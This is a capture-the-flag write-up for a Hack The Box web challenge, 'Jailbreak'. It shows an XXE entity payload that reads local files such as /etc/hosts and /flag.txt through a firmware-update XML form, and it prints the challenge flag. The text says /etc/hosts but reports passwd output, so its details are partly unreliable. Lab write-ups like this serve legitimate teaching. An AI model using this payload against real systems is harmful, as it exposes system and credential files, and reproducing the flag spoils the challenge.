# Jailbreak - Web

## Context

Given access to a webpage spawned by HTB docker. 

## Solution

Navigating through the webpage, on the ROM page, we see the option to submit XML code for a firmware update:

```xml
<FirmwareUpdateConfig>
    <Firmware>
        <Version>1.33.7</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
    <Components>
        <Component name="navigation">
            <Version>3.7.2</Version>
            <Description>Updated GPS algorithms for improved wasteland navigation.</Description>
            <Checksum type="SHA-256">e4d909c290d0fb1ca068ffaddf22cbd0</Checksum>
        </Component>
        <Component name="communication">
            <Version>4.5.1</Version>
            <Description>Enhanced encryption for secure communication channels.</Description>
            <Checksum type="SHA-256">88d862aeb067278155c67a6d6c0f3729</Checksum>
        </Component>
        <Component name="biometric_security">
            <Version>2.0.5</Version>
            <Description>Introduces facial recognition and fingerprint scanning for access control.</Description>
            <Checksum type="SHA-256">abcdef1234567890abcdef1234567890</Checksum>
        </Component>
    </Components>
    <UpdateURL>https://satellite-updates.hackthebox.org/firmware/1.33.7/download</UpdateURL>
</FirmwareUpdateConfig>
```

Pressing the submit button displays the following output on screen: 

```
Firmware version 1.33.7 update initiated.
```

Reading through the XML code provided, we can see that the value `1.33.7` is stored in the `<Version>` tag under `<Firmware>`.

I then experimented with executing an XXE attack in BurpSuite's Repeater to find the flag:

Inserted XML Entity containing first attempt payload:

```
  <!DOCTYPE FirmwareUpdateConfig [
    <!ENTITY xxe SYSTEM "/etc/hosts">
]>
```

xxe1

Success! By replacing the version with the entity payload, I can see that the webpage is printing the contents of the passwd file from the hosting system. I tried a few more paths before realising the flag could simply be found by setting the payload to `/flag.txt`:

xxe2

**HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_e34d5ec1334f7f5da949bccadd8a7550}**




